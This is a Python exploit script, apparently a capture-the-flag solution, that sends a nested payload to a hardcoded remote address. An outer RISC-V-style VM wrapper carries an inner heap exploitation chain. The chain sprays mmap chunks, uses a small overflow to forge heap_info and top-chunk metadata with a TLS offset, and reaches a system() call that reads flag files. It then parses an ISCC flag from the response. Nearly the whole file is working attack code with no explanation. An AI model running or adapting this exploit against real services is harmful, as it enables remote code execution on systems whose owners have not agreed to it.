#!/usr/bin/env python3
import re
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else '39.96.193.120:8888'
HOST, PORT = TARGET.split(':')
PORT = int(PORT)

HEAP_MAX_SIZE = 0x4000000
MINSIZE = 0x20
MMAP_THRESHOLD = 0x20000
PAGE_SIZE = 0x1000
TLS_DELTA = 0x800000  # 当前复原版本先沿用公开 BlindVM 思路里的偏移


def p32(x):
    return struct.pack('<I', x & 0xffffffff)


def p64(x):
    return struct.pack('<Q', x & 0xffffffffffffffff)


# --------------------
# Outer EVM helpers
# --------------------
def r_u_type(opc, rd, imm20):
    return ((imm20 & 0xfffff) << 12) | (rd << 7) | opc


def r_i_type(opc, rd, f3, rs1, imm):
    return ((imm & 0xfff) << 20) | (rs1 << 15) | (f3 << 12) | (rd << 7) | opc


def r_b_type(opc, f3, rs1, rs2, imm):
    assert imm % 2 == 0
    imm &= 0x1fff
    bit12 = (imm >> 12) & 1
    bit11 = (imm >> 11) & 1
    bits10_5 = (imm >> 5) & 0x3f
    bits4_1 = (imm >> 1) & 0xf
    return ((bit12 << 31) | (bits10_5 << 25) | (rs2 << 20) | (rs1 << 15) |
            (f3 << 12) | (bits4_1 << 8) | (bit11 << 7) | opc)


def r_xstore(rs1, rs2, f3, off):
    return (((off >> 5) & 0x7f) << 25) | (rs2 << 20) | (rs1 << 15) | \
           (f3 << 12) | ((off & 0x1f) << 7) | 0x2f


def pack_ins(ins):
    return struct.pack('<I', ins & 0xffffffff)


def evm_copy_bytes_from_data(total_len, src_guest=0x1000, dst_direct=0x300000):
    assert total_len > 0 and total_len % 4 == 0
    end = src_guest + total_len
    code = []
    code.append(r_u_type(0x37, 1, src_guest >> 12))
    code.append(r_u_type(0x37, 2, dst_direct >> 12))
    code.append(r_u_type(0x37, 3, end >> 12))
    loop_pc = len(code) * 4
    code.append(r_i_type(0x03, 4, 6, 1, 0))
    code.append(r_xstore(2, 4, 2, 0))
    code.append(r_i_type(0x13, 1, 0, 1, 4))
    code.append(r_i_type(0x13, 2, 0, 2, 4))
    branch_pc = len(code) * 4
    imm = loop_pc - (branch_pc + 4)
    code.append(r_b_type(0x63, 6, 1, 3, imm))
    code.append(0x13)
    return b''.join(pack_ins(x) for x in code)


def wrap_blind_payload(blind_patch: bytes) -> bytes:
    padded_len = (len(blind_patch) + 3) & ~3
    data_pages = max(1, (padded_len + 0xfff) // 0x1000)
    data = blind_patch.ljust(data_pages * 0x1000, b'\x00')
    code = evm_copy_bytes_from_data(padded_len)
    blind = (b'\x13\x00\x00\x00' * ((padded_len + 3) // 4))[:padded_len]
    payload = str(len(code)).encode() + b'\n'
    payload += str(data_pages).encode() + b'\n'
    payload += code + data
    payload += str(padded_len).encode() + b'\n0\n' + blind
    return payload


# --------------------
# Inner BlindVM helpers
# --------------------
payloads = []
ADD_INDEX = -1


def add(size):
    global ADD_INDEX
    payloads.append(b'\x00' + p32(size))
    ADD_INDEX += 1


def edit(idx, content: bytes):
    payloads.append(b'\x01' + p32(idx) + p32(len(content)) + content)


def finish():
    payloads.append(b'\x02')


# first chunk: command string for system(...)
add(0x204a0 - 0x8 - MINSIZE)
cmd = b'cat /flag;cat /flag.txt;cat flag.txt\x00'
edit(ADD_INDEX, cmd)

# heap spraying / gap acquisition
for _ in range(0x1ff):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(PAGE_SIZE * 2 + 0x11)
for _ in range(0x1ff):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(0x1ff80 - 0x20)
add(PAGE_SIZE * 2 + 0x11)

# prepare fake metadata used during later heap_info / top-chunk shaping
add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
add_data = b'\x00' * 0x20 + p64(0x1020) + p64(0x10) + p64(0x10) + p64(0x1)
while add_size >= end_size:
    add(add_size - 0x8)
    add_size -= PAGE_SIZE
    edit(ADD_INDEX, add_data)

# first +4 overflow into next metadata
add(0x18)
edit(ADD_INDEX, b'\x00' * 0x18 + p32(0x1021))
add(0xfe0 - 8)
add(0x20 - 8)
edit(ADD_INDEX, b'\x30')
add(0x20 - 8)

# more spraying / heap-space stepping
for _ in range(0x1ff - 1):
    add(MMAP_THRESHOLD - 0x8 - 0x10)
add(0x1ff80 - 0x20 - 0x20)
add(0x18)
edit(ADD_INDEX, b'\x00' * 0x18 + p32(HEAP_MAX_SIZE * 2 + 0x21))
add(HEAP_MAX_SIZE // 2 - 0x8)
add(HEAP_MAX_SIZE // 2 + 0x18)
add(0x18)
edit(ADD_INDEX, p64(0x21000) + p64(0x21000) + p64(0x1000))

# patch candidate heap_info fields page-by-page
add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
change_idx = 0x402
while add_size >= end_size:
    add_data = (
        p64(add_size + 2 * PAGE_SIZE + TLS_DELTA) +
        p64(add_size + 2 * PAGE_SIZE + TLS_DELTA) +
        p64(0x1000) +
        p64(add_size + 0x1fe0 + TLS_DELTA + 1)
    )
    add_size -= PAGE_SIZE
    edit(change_idx, add_data)
    change_idx += 1

# final steps from public BlindVM chain, adapted into this wrapper
add(0x13C0 - 0x28)
for _ in range((0x800000 + 0x1fe0) // (MMAP_THRESHOLD - 0x8 - 0x10)):
    add(MMAP_THRESHOLD - 0x8 - 0x10)

add_size = HEAP_MAX_SIZE - PAGE_SIZE
end_size = MMAP_THRESHOLD
while add_size >= end_size:
    add(add_size)
    add_size -= PAGE_SIZE

add(0x3000)
add(0xd4d0 + 0x8)
add(0x18)
edit(ADD_INDEX, p64(0x0F001200004DDE) + p64(0x50D70) + p64(0x101))
finish()

blind = b''.join(payloads)
outer = wrap_blind_payload(blind)

print(f'[+] blind payload length = {len(blind)}')
print(f'[+] outer payload length = {len(outer)}')

sock = socket.create_connection((HOST, PORT), timeout=10)
sock.settimeout(10)
sock.sendall(outer)
resp = b''
try:
    while True:
        data = sock.recv(4096)
        if not data:
            break
        resp += data
except Exception:
    pass
sock.close()

print(resp.decode(errors='replace'))
m = re.search(rb'ISCC\{[^}]+\}', resp)
if m:
    print('=' * 50)
    print(f'[!!!] FLAG: {m.group(0).decode()}')
    print('=' * 50)